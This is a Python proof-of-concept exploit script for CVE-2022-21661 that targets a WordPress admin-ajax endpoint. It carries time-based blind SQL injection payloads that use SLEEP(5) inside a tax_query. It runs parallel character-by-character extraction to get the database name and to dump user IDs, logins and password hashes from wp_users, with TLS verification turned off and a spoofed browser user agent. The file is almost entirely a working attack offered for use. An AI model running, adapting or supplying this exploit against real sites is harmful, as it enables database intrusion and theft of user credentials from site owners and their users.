#!/usr/bin/python3

from argparse import ArgumentParser
import sys
import requests
import string
import time
import termios
from multiprocessing import Pool

# Disable insecure request warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Constants
CLEAR_SCREEN = "\033[H\033[2J\033[3J"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36"
HEADERS = {'User-Agent': USER_AGENT}

# Payloads
PAYLOADS = {
    'scan': """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (select LENGTH(database()) > '0') THEN SLEEP(5) ELSE 2070 END)"]}}}""",
    'db_len': """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (select LENGTH(database()) = '%s') THEN SLEEP(5) ELSE 2070 END)"]}}}""",
    'db_name': """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (select SUBSTRING(LOWER(database()),%d,1) = '%s') THEN SLEEP(5) ELSE 2070 END)"]}}}""",
    'usr_dmp_len': """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (select LENGTH((select Group_CONCAT(id,':',user_login,':',user_pass,',') from wp_users)) = '%s') THEN SLEEP(5) ELSE 2070 END)"]}}}""",
    'usr_dump': """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (select SUBSTRING((select Group_CONCAT(id,':',user_login,':',user_pass,',') from wp_users),%d,1) = BINARY '%s') THEN SLEEP(5) ELSE 2070 END)"]}}}"""
}

config = {
    "data": {
        "action": "ecsload",
        "query": "",
        "ecs_ajax_settings": """{"post_id":"1", "current_page":1, "widget_id":1, "theme_id":1, "max_num_pages":10}"""
    }
}

def log(msg):
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    new = termios.tcgetattr(fd)
    new[3] = new[3] & ~termios.ECHO  # lflags
    try:
        termios.tcsetattr(fd, termios.TCSADRAIN, new)
        sys.stdout.write(CLEAR_SCREEN)
        sys.stdout.write("%s\n" % msg)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)

def do_request(url, query, proxy=None, domain=None):
    data = config['data']
    data['query'] = query
    headers = HEADERS.copy()
    if domain:
        headers['Host'] = domain
    proxies = {"http": proxy, "https": proxy} if proxy else None
    start = time.time()
    r = requests.post(url, data=data, headers=headers, proxies=proxies, verify=False)
    if r.status_code == 500:
        end = time.time()
        diff = end - start
        return diff >= 5.00

def find_length(url, query, proxy=None, domain=None):
    length = 0
    for i in range(1, 1000):
        tmp = query % i
        log("Searching for length:\nTrying len %d" % i)
        r = do_request(url, tmp, proxy=proxy, domain=domain)
        if r == True:
            length = i
            break
    log("length is %d" % length)
    return length

def extract(url, query, idx, proxy=None, domain=None):
    chars = string.ascii_letters + string.digits + string.punctuation
    for c in chars:
        tmp = query % (idx, c)
        r = do_request(url, tmp, proxy=proxy, domain=domain)
        if r == True:
            return idx, c
    return (idx, "?")

def errcallback(args):
    print(f"error {args}")

def exploit(url, query_len, query, proxy=None, domain=None) -> str:
    print("Finding length.")
    length = find_length(url, query_len, proxy=proxy, domain=domain)
    log("length Found is %d" % length)

    pool = Pool(processes=3)
    value = list("- " * length)

    def callback(args):
        idx, cr = args
        value[(idx - 1)] = cr
        value.pop()
        log(f'Retrieving string: {"".join(value)}')

    print(f'Retrieving string: {"".join(value)}')
    
    for i in range(1, length + 1):
        pool.apply_async(extract, args=(url, query, i, proxy, domain), callback=callback, error_callback=errcallback)

    pool.close()
    pool.join()
    
    return values_to_str(value)

def values_to_str(value):
    return "".join(value)

if __name__ == '__main__':
    parser = ArgumentParser(description='POC for CVE-2022-21661 to retrieve database information')
    parser.add_argument('--url', help="URL for the exploit (e.g., http://localhost:8000/wp-admin/admin-ajax.php)", type=str, required=True)
    parser.add_argument('--payload', help='Exploit option id: 1 for scan, 2 for db name, 3 for user dump', type=int, required=True)
    parser.add_argument('--limit-users', help='Limit the number of users retrieved (for payload 3)', type=int)
    parser.add_argument('--output', help='File to store results', type=str)
    parser.add_argument('--domain', help='Domain to include as a request header', type=str)
    parser.add_argument('--proxy', help='Proxy to use for the requests (e.g., 127.0.0.1:8081)', type=str)
    args = parser.parse_args()

    url = args.url
    payload = args.payload
    limit_users = args.limit_users
    output = args.output
    domain = args.domain
    proxy = args.proxy

    result = ""
    if payload == 1:
        response = do_request(url, PAYLOADS['scan'], proxy=proxy, domain=domain)
        if response:
            print(f'Vulnerable: {url}')
        else:
            print("OK")
    elif payload == 2:
        result = exploit(url, PAYLOADS['db_len'], PAYLOADS['db_name'], proxy=proxy, domain=domain)
    elif payload == 3:
        if limit_users:
            PAYLOADS['usr_dmp_len'] = """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (SELECT LENGTH(Group_CONCAT(users.id,':',users.user_login,':',users.user_pass,',')) FROM (SELECT id, user_login, user_pass FROM wp_users LIMIT %s) AS users) = '%s' THEN SLEEP(5) ELSE 2070 END)"]}}}""" % (limit_users, '%s')
            PAYLOADS['usr_dump'] = """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (select SUBSTRING((SELECT Group_CONCAT(users.id,':',users.user_login,':',users.user_pass,',') FROM (SELECT id, user_login, user_pass FROM wp_users LIMIT %s) AS users),%d, 1) = BINARY '%s') THEN SLEEP(5) ELSE 2070 END)"]}}}""" % (limit_users, '%d', '%s')
        result = exploit(url, PAYLOADS['usr_dmp_len'], PAYLOADS['usr_dump'], proxy=proxy, domain=domain)

    if output:
        with open(output, 'w') as file:
            file.write(result.replace(',,', ',').replace(',', '\n').replace(':', ','))
